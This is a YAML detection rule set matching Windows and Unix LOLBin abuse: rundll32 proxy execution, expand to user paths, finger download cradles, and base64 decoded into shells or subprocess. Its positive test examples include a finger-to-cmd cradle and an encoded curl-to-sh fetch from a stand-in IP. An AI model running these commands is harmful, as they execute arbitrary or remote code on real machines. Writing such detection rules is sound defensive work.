- id: mention.lolbin_rundll32_setupapi_inf
  title: rundll32 setupapi InstallHinfSection text
  match:
    literal: ['setupapi.dll,InstallHinfSection', 'setupapi,InstallHinfSection']
  case_sensitive: false
  strength: weak
  attack: [T1218.011]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Suspicious Rundll32 Setupapi.dll Activity (Konstantin Grishchenko, oscd.community)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_rundll32_setupapi_installhinfsection.yml
    license: DRL-1.1
    upstream_id: 285b85b1-a555-4095-8652-a8a4106af63f
  rationale: >-
    InstallHinfSection runs an INF's commands (LOLBAS Setupapi). Driver and software installers call it constantly,
    and the rule itself needs a runonce.exe child to be suspicious, so it is a weak candidate; the INF path decides.
  examples:
    positive:
      - 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Users\Public\x.inf'
    negative:
      - 'rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 C:\Drivers\a.inf'
      - 'pnputil /enum-drivers'

- id: mention.lolbin_rundll32_pcwutl
  title: rundll32 pcwutl LaunchApplication text
  match:
    literal: ['pcwutl.dll,LaunchApplication', 'pcwutl,LaunchApplication']
  case_sensitive: false
  strength: medium
  attack: [T1218.011]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Code Execution via Pcwutl.dll (Julia Fomina, oscd.community)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_lolbin_pcwutl.yml
    license: DRL-1.1
    upstream_id: 9386d78a-7207-4048-9c9f-a93a7c2d1c05
  rationale: >-
    The Program Compatibility helper's LaunchApplication export starts any program under rundll32. The Program
    Compatibility Troubleshooter uses it, so it is medium as upstream.
  examples:
    positive:
      - 'rundll32.exe pcwutl.dll,LaunchApplication C:\Users\Public\x.exe'
    negative:
      - 'msdt.exe -id PCWDiagnostic'
      - 'rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl'

- id: mention.lolbin_rundll32_zipfldr_routethecall
  title: rundll32 zipfldr RouteTheCall text
  match:
    literal: ['zipfldr.dll,RouteTheCall', 'zipfldr,RouteTheCall']
  case_sensitive: false
  strength: strong
  attack: [T1218.011]
  telemetry: [any]
  source:
    name: LOLBAS project, Zipfldr.dll
    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSLibraries/Zipfldr.yml
    license: GPL-3.0
    upstream_id: Zipfldr.dll
  rationale: >-
    The compressed-folder handler's RouteTheCall export launches an arbitrary program (LOLBAS Zipfldr). Explorer
    opens zip folders without a rundll32 command line, so the text has no ordinary use.
  examples:
    positive:
      - 'rundll32.exe zipfldr.dll,RouteTheCall C:\Users\Public\x.exe'
      - 'rundll32 zipfldr,RouteTheCall C:\Users\Public\x.exe'
    negative:
      - 'explorer.exe C:\Users\alice\Downloads\report.zip'
      - 'powershell -c "Expand-Archive C:\Temp\a.zip -DestinationPath C:\Temp\a"'

- id: mention.lolbin_rundll32_url_dll
  title: rundll32 url.dll OpenURL or FileProtocolHandler text
  match:
    anchored: 'url\.dll, {0,1}(?:OpenURL|FileProtocolHandler)\b'
  case_sensitive: false
  strength: medium
  attack: [T1218.011]
  telemetry: [any]
  source:
    name: LOLBAS project, Url.dll
    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSLibraries/Url.yml
    license: GPL-3.0
    upstream_id: Url.dll
  rationale: >-
    url.dll's OpenURL and FileProtocolHandler exports open whatever they are given, including .hta and .exe files
    (LOLBAS Url). Applications also use FileProtocolHandler to open web links in the default browser, so it is
    medium; a local executable or HTA argument is the lead.
  examples:
    positive:
      - 'rundll32.exe url.dll,OpenURL C:\Users\Public\x.hta'
      - 'rundll32.exe url.dll,FileProtocolHandler C:\Users\Public\x.exe'
    negative:
      - 'rundll32.exe shell32.dll,OpenAs_RunDLL C:\Temp\a.log'
      - 'C:\Windows\System32\rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il'

- id: mention.lolbin_rundll32_desk_screensaver
  title: rundll32 desk.cpl InstallScreenSaver text
  match:
    literal: ['desk.cpl,InstallScreenSaver']
  case_sensitive: false
  strength: medium
  attack: [T1218.011, T1546.002]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Rundll32 InstallScreenSaver Execution (Christopher Peacock, SCYTHE, TactiKoolSec)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_rundll32_installscreensaver.yml
    license: DRL-1.1
    upstream_id: 15bd98ea-55f4-4d37-b09a-e7caa0fa2221
  rationale: >-
    Installing a 'screensaver' through desk.cpl runs the .scr, which is any executable (LOLBAS Desk). Installing a
    real screensaver is the rule's listed false positive, so it is medium.
  examples:
    positive:
      - 'rundll32.exe desk.cpl,InstallScreenSaver C:\Users\Public\x.scr'
    negative:
      - 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,1'
      - 'control.exe desk.cpl,,@screensaver'

- id: mention.lolbin_rundll32_control_rundll_dll
  title: rundll32 shell32 Control_RunDLL text with a .dll, .exe or .ocx argument
  match:
    anchored: 'shell32\.dll, {0,1}Control_RunDLL {1,3}["'']?[^\n"'' ]{1,200}\.(?:dll|exe|ocx)\b'
  case_sensitive: false
  strength: medium
  attack: [T1218.011, T1218.002]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Shell32 DLL Execution in Suspicious Directory (Christian Burkard, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_rundll32_shell32_susp_execution.yml
    license: DRL-1.1
    upstream_id: 32b96012-7892-429e-b26c-ac2bf46066ff
  rationale: >-
    Control_RunDLL normally opens a .cpl applet; given a DLL or executable it loads it as a Control Panel item
    (LOLBAS Shell32). The rule rates the user-directory case high; across all paths a few vendor tools do this, so
    it is medium.
  examples:
    positive:
      - 'rundll32.exe shell32.dll,Control_RunDLL C:\Users\Public\x.dll'
    negative:
      - 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,1'
      - 'rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl'

- id: mention.lolbin_rundll32_shellexec_rundll
  title: rundll32 shell32 ShellExec_RunDLL text
  match:
    literal: ['ShellExec_RunDLL']
  case_sensitive: false
  strength: medium
  attack: [T1218.011]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Suspicious Usage Of ShellExec_RunDLL (Nasreddine Bencherchali, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_rundll32_susp_shellexec_execution.yml
    license: DRL-1.1
    upstream_id: d87bd452-6da1-456e-8155-7dc988157b7d
  rationale: >-
    ShellExec_RunDLL starts any program or command line through rundll32 (LOLBAS Shell32), breaking the parent chain.
    Some shell integrations call it, so it is medium; the rule's high form adds temp paths or script hosts.
  examples:
    positive:
      - 'rundll32 SHELL32.DLL,ShellExec_RunDLL C:\Users\Public\x.exe'
    negative:
      - 'rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl'
      - 'rundll32.exe shell32.dll,OpenAs_RunDLL C:\Temp\a.log'

- id: mention.lolbin_rundll32_ordinal_call
  title: rundll32 text with an ordinal export reference
  match:
    anchored: 'rundll32(?:\.exe)?["'']? [^\n]{1,200}, {0,1}#[-+]?[0-9]{1,5}\b'
  case_sensitive: false
  strength: medium
  attack: [T1218.011]
  telemetry: [any]
  source:
    name: 'SigmaHQ: DLL Call by Ordinal Via Rundll32.EXE (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules-threat-hunting/windows/process_creation/proc_creation_win_rundll32_by_ordinal.yml
    license: DRL-1.1
    upstream_id: e79a9e79-eb72-4e78-a628-0e7e8f59e89c
  rationale: >-
    Calling an export by number hides which function runs and is common in loader DLLs (and in the obfuscated
    '#-', '#+' and padded forms of rule 43fa5350-db63-4b8f-9a01-789a427074e1). Build tools and EdgeHTML also call
    exports by ordinal, so it is medium.
  examples:
    positive:
      - 'rundll32.exe C:\Users\Public\x.dll,#2'
      - 'rundll32.exe shell32.dll,#44 C:\Users\Public\x.dll'
    negative:
      - 'rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il'
      - 'rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL desk.cpl'

- id: mention.lolbin_expand_cab_to_user_path
  title: 'expand -F: text with a user, temp or admin-share destination'
  match:
    anchored: 'expand(?:\.exe)?["'']? [^\n]{0,200}[-/]F:[^\n]{0,150}(?::\\Perflogs\\|:\\ProgramData|:\\Users\\Public\\|:\\Windows\\Temp\\|\\Admin\$\\|\\AppData\\Local\\Temp\\|\\AppData\\Roaming\\|\\C\$\\)'
  case_sensitive: false
  strength: medium
  attack: [T1140, T1105]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Potentially Suspicious Cabinet File Expansion (Bhabesh Raj, X__Junior, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_expand_cabinet_files.yml
    license: DRL-1.1
    upstream_id: 9f107a84-532c-41af-b005-8d12a607639f
  rationale: >-
    Expanding a cabinet into ProgramData, Public, Windows\Temp, AppData or an admin share is how CAB-packed payloads
    are unpacked (LOLBAS Expand). Vendor updaters (the rule excludes a Dell updater) do it too, so it is medium.
  examples:
    positive:
      - 'expand C:\Users\Public\a.cab -F:* C:\ProgramData\x'
    negative:
      - 'expand D:\Drivers\net.cab -F:* D:\Drivers\net'
      - 'Nov 21 10:07:00 ws01 TrustedInstaller: Windows Update package KB5032189 expanded'

- id: mention.lolbin_finger_to_shell
  title: finger output with a pipe into cmd or PowerShell
  match:
    anchored: 'finger(?:\.exe)? [^\n|]{1,200}\|[^\n]{0,40}\b(?:cmd|powershell)\b'
  case_sensitive: false
  strength: strong
  attack: [T1105, T1059.003]
  telemetry: [any]
  source:
    name: LOLBAS project, Finger.exe
    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSBinaries/Finger.yml
    license: GPL-3.0
    upstream_id: Finger.exe
  rationale: >-
    'finger user@host | more +2 | cmd' runs commands served by a finger daemon, a download cradle used by commodity
    loaders. Nobody pipes finger output into a shell for administration.
  examples:
    positive:
      - 'cmd /c finger x@203.0.113.7 | more +2 | cmd'
    negative:
      - 'finger alice@mail.corp.example.org'
      - 'Nov 21 10:08:00 lnx01 bash[700]: HISTORY: finger -l alice'

- id: mention.lolbin_finger_user_at_host
  title: finger user@host text
  match:
    anchored: 'finger(?:\.exe)? {1,3}[^\s@|]{1,64}@[^\s|]{1,253}'
  case_sensitive: false
  strength: medium
  attack: [T1105]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Finger.EXE Execution (Florian Roth, Nextron Systems, omkar72, oscd.community)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_finger_execution.yml
    license: DRL-1.1
    upstream_id: af491bca-e752-4b44-9c86-df5680533dbc
  rationale: >-
    The rule rates any finger.exe run high because its only common modern use is fetching data from a remote finger
    service. On Unix, finger user@host is still an occasional directory lookup, so the text is medium.
  examples:
    positive:
      - 'C:\Windows\System32\finger.exe data@203.0.113.7'
    negative:
      - 'Nov 21 10:09:00 lnx01 bash[701]: HISTORY: finger -l alice'
      - 'Nov 21 10:09:01 lnx01 bash[702]: HISTORY: getent passwd alice'

- id: mention.lolbin_b64decode_to_shell
  title: BSD b64decode with a pipe into a shell
  match:
    anchored: 'b64decode [^|\n]{0,40}\| {0,3}(?:sudo )?(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
  case_sensitive: true
  strength: medium
  attack: [T1140, T1059.004]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Linux Base64 Encoded Pipe to Shell (pH-T, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_base64_execution.yml
    license: DRL-1.1
    upstream_id: ba592c6d-6888-43c3-b8c6-689b8fe47337
  rationale: >-
    The rule's base64-decode-into-shell shape with the BSD and macOS decoder name: decoding straight into a shell
    hides the real command. Provisioning scripts occasionally do it, so it is medium as upstream.
  examples:
    positive:
      - 'Nov 21 10:10:00 bsd01 sh[700]: echo Y3VybCBodHRwOi8vMjAzLjAuMTEzLjcveCB8IHNo | b64decode -r | sh'
    negative:
      - 'Nov 21 10:10:01 bsd01 sh[701]: b64decode -r cert.b64 > cert.der'
      - 'Nov 21 10:10:02 bsd01 sh[702]: echo hello | b64encode -r -'

- id: mention.lolbin_python_base64_subprocess
  title: python -c text with base64 decode and subprocess, os.system or exec
  match:
    anchored: 'python[0-9.]{0,4} {1,3}-c {1,3}["''][^\n]{0,40}import base64[^\n]{0,300}(?:subprocess|os\.system|exec\()'
  case_sensitive: false
  strength: medium
  attack: [T1140, T1059.006]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Python One-Liners with Base64 Decoding - Linux (Hugh Ryan, Swachchhanda Shrawan Poudel)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_python_base64_encoded_execution.yml
    license: DRL-1.1
    upstream_id: 55e862a8-dd9c-4651-807a-f21fcad56716
  rationale: >-
    The rule's python -c base64 one-liner with an execution sink on the same line: decoded (often XOR-masked) text
    handed to subprocess, os.system or exec. Data scripts decode base64 but rarely run the result, so it is medium.
  examples:
    positive:
      - 'Nov 21 10:11:00 lnx01 bash[703]: HISTORY: python3 -c ''import base64, subprocess; subprocess.run(base64.b64decode("aWQ=").decode(), shell=True)'''
    negative:
      - 'Nov 21 10:11:01 lnx01 bash[704]: HISTORY: python3 -c ''import base64; print(base64.b64decode("aGk=").decode())'''
      - 'Nov 21 10:11:02 lnx01 bash[705]: HISTORY: python3 -m pip install --upgrade pip'
